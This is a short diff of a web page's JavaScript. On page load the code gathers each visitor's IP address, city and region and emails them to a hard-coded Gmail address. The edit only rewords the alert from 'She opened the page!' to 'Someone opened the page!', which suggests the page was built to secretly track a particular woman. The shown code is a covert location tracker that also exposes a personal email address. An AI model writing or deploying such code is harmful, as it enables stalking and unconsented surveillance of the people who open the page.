@@ -182,7 +182,7 @@ document.addEventListener("DOMContentLoaded", function () {
         .then(data => {
             let templateParams = {
                 to_email: "techpc.u2005@gmail.com",
-                message: `She opened the page! 
+                message: `Someone opened the page! 
                           IP: ${data.ip} 
                           City: ${data.city}, 
                           Region: ${data.region}, 
